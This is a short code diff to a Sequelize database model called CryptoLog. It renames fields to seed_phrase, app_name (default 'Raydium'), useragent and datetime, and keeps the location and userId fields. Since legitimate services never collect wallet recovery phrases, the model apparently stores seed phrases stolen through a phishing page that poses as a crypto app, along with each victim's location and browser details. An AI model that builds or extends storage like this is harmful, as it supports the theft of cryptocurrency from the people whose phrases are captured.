@@ -2,11 +2,7 @@ import { DataTypes } from 'sequelize';
 import sequelize from '../sequelize.js';
 
 const CryptoLogs = sequelize.define('CryptoLog', {
-  specialPhrase: {
-    type: DataTypes.STRING,
-    defaultValue: "one two three four five six seven eight nine ten eleven twelve",
-  },
-  appName: {
+  app_name: {
     type: DataTypes.STRING,
     defaultValue: "Raydium",
   },
@@ -14,7 +10,7 @@ const CryptoLogs = sequelize.define('CryptoLog', {
     type: DataTypes.STRING,
     defaultValue: '',
   },
-  phrase: {
+  seed_phrase: {
     type: DataTypes.STRING,
     defaultValue: '',
   },
@@ -37,13 +33,17 @@ const CryptoLogs = sequelize.define('CryptoLog', {
   location: {
     type: DataTypes.JSON, 
   },
-  userInfo: {
+  useragent: {
     type: DataTypes.JSON, 
   },
   userId: {
     type: DataTypes.INTEGER,
     allowNull: false, 
-  }
+  },
+  datetime: {
+    type: DataTypes.DATE,
+    defaultValue: DataTypes.NOW, // Automatically sets to current date/time
+  },
 }, {
   timestamps: true,
 });
